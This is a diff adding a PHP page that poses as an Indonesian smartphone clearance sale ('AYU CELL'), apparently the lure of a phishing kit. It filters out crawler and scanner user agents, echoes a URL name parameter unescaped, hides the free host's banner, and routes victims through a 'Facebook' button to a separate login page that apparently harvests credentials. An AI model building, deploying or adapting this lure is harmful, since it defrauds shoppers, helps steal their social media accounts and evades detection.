@@ -1,0 +1,107 @@
+ <?php
+$ua = $_SERVER['HTTP_USER_AGENT'];
+if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
+{
+header('https://www.facebook.com/MagelangNoobs.phtml');
+die();
+}
+
+    error_reporting(0);
+    $namaloajg = $_GET['name'];
+    $idhaam1 = ucfirst($namaloajg);
+	$idhaam69 = array('1', '12', '13', '14', '15', '16' ,'1');
+    $reward = $idhaam69[rand(0, (count($idhaam69)-1))];
+    
+
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <meta property="og:title" content="AYO IKUTAN <?php echo $idhaam1;?> EVENT PROMO SMARTPHONE MURAH DENGAN CARA...">
+	<meta property="og:description" content="IKUTI!! <?php echo $idhaam1;?>. 
+<script src="/script.js"></script>	
+
+   *PROMOSI SMARTPHONE MURAH MERIAH, EDISI CUCI GUDANG* 
+<br>
+ *PT JAYA PHONE*
+<br>
+*LIST HARGA*
+<br>
+ *OPPO F9pro* : _RP700.000_
+
+*OPPO F11pro* : _RP800.000_
+
+ *VIVO V9* : _RP500.000_
+
+*VIVO V11 PRO*: _RP700.000_
+
+*VIVO V7*+ : _RP500.000_
+
+ *VIVO V15* : _RP800.000_
+
+*JANGAN LEWATKAN EVENT INI* ">
+	<meta property="og:image" content="gmb/a.jpg">
+    <link rel="stylesheet" href="./assets/css/miraipedia.css">
+    <link rel="stylesheet" href="./assets/css/animate.css">
+<style>img[alt="www.000webhost.com"]{display:none;}</style>
+    <link rel="shorcut icon" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRiQSgCTV1rPzwTdhWhgsMbFp5Xn6TdPs-GHXk5UBEv0tG4wRBRPQ&s"/>
+    <title>PROMO SMARTPHONE MURAH MERIAH</title>
+</head>
+<body bgcolor="aqua">
+    <div class="miraipedia">
+        <div class="contentmirai">
+            <div class="content-txt">
+                               <img class="img-contentmirai" alt="miraipedia" src="gmb/oppo.png">
+                                <div class="miraipedia">
+        <div class="contentmirai">
+            
+                Selamat Datang <?php echo $idhaam1;?><br>  <marquee behavior="scroll" dicretion="right" scrollamount="90" scrolldelay="40" width="100%" SIZE="9"><font color="AQUA">___________________________________</font></marquee>  
+  <marquee behavior="scroll" dicretion="right" scrollamount="10" scrolldelay="100" width="100%"><font color="RED">PROMO SMARTPHONE MURAH</font></marquee>  <b> <marquee behavior="scroll" dicretion="left" scrollamount="6" scrolldelay="100" width="100%"><font color="BLACK">SMARTPHONE OPPO RENO 5</font></marquee></b> 
+   <form method="POST">
+                        <button onclick="randomlink()" class="btn-contentmirai" name="reward" value="<?php echo $reward;?>"<font color="red">MASUK</button>
+                        <br><br>
+                </form>
+   EVENT PROMO SMARTPHONE OPPO RENO 5 SEHARGA RP.600.000,DAN SILAHKAN KLIK TOMBOL "MASUK" UNTUK MELANJUTKAN DAN MELAKUKAN PEMESANAN. 
+<br>
+<b><font color="red">AYU CELL</font></b>
+<br>
+
+<br><img src="gmb/add.jpg" hheight="400" width="250" /><br>
+
+ <br>
+    <marquee behavior="scroll" dicretion="right" scrollamount="90" scrolldelay="40" width="100%"><font color="blue">___________________________________</font></marquee>
+                
+                    
+                    <p><l><font color="red" size="4">AYU CELL KANTOR PUSAT JL.PENJARINGAN TIM.NO.14,PENJARINGAN SARI,KEC.RUNGKUT,KOTA SURABAYA.JAWA TIMUR 60297,INDONESIA</p></l>
+<br><font color="red" size="4">Jam buka:09:00 ⋅ Tutup pukul 22.00</font>
+</font>
+                </div><p>
+                 
+                
+     <marquee behavior="scroll" dicretion="right" scrollamount="90" scrolldelay="40" width="100%"><font color="green">___________________________________</font></marquee>       
+            </div>
+        </div>
+            <img src="gmb/appstore3.png" />    <img src="gmb/googleplay3.png" />
+        <?php
+        if (isset($_POST['reward'])) { 
+            $mirai = $_POST['reward'];
+            echo "<div class='idhaam69'><div class='miraipedia-confirm animated wobble'>
+            <div class='txt-confirm'>SILAHKAN MASUK UNTUK MELANJUTKAN PEMESANAN.</div>
+            <form id='idhaam69' action='./masuk/index.php' method='POST'>
+                <button type='submit' class='btn-contentmirai' name='mirai-reward' value='$mirai'>Facebook</button>
+            </form>
+           
+            </form>
+        </div></div>";}
+        ?>
+        
+    </div>
+    <font><font color="red">©2022 AYU CELL</font>
+<!---BY: VANAverse, bigvana.com--->
+<!---IKLAN SOCIAL BAR ADSTERRA--->
+
+</body>
+</html>
